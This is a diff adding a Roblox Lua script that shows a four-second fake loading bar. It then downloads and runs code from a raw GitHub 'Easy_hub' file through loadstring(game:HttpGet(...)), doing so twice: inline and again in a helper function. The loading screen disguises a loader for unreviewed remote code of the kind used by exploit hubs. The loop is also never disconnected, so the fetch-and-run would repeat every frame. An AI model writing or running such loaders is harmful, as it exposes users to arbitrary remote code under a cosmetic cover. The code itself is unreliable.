@@ -1,0 +1,58 @@
+local player = game:GetService("Players").LocalPlayer
+local guiService = game:GetService("GuiService")
+
+-- Create the loading UI
+local loadingUI = Instance.new("ScreenGui")
+loadingUI.Name = "LoadingUI"
+loadingUI.Parent = player.PlayerGui
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(0, 300, 0, 50)
+loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -25)
+loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+loadingFrame.BackgroundTransparency = 0.5
+loadingFrame.Parent = loadingUI
+
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)  -- starts with 0 width
+loadingBar.Position = UDim2.new(0, 0, 0, 0)
+loadingBar.BackgroundColor3 = Color3.new(0, 1, 0)
+loadingBar.Parent = loadingFrame
+
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(0, 100, 0, 20)
+percentageLabel.Position = UDim2.new(0.5, -50, 0, 30)
+percentageLabel.AnchorPoint = Vector2.new(0.5, 0)
+percentageLabel.Font = Enum.Font.SourceSans
+percentageLabel.FontSize = Enum.FontSize.Size24
+percentageLabel.TextColor3 = Color3.new(1, 1, 1)
+percentageLabel.TextStrokeTransparency = 0
+percentageLabel.Parent = loadingFrame
+
+-- Animate the loading bar
+local startTime = tick()
+local endTime = startTime + 4  -- 4 seconds loading time
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    local elapsedTime = tick() - startTime
+    local progress = elapsedTime / 4  -- 4 seconds total
+    
+    loadingBar.Size = UDim2.new(progress, 0, 1, 0)
+    percentageLabel.Text = math.floor(progress * 100) .. "%"
+    
+    if elapsedTime >= 4 then
+        loadingUI:Destroy()
+        
+        -- Execute your script or function after loading completes
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/User999191/Easy_hub/main/sense"))()      
+        -- Example: Run a function
+        RunAfterLoadingComplete()
+    end
+end)
+
+-- Example function to execute after loading completes
+function RunAfterLoadingComplete()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/User999191/Easy_hub/main/sense"))()      
+  
+end
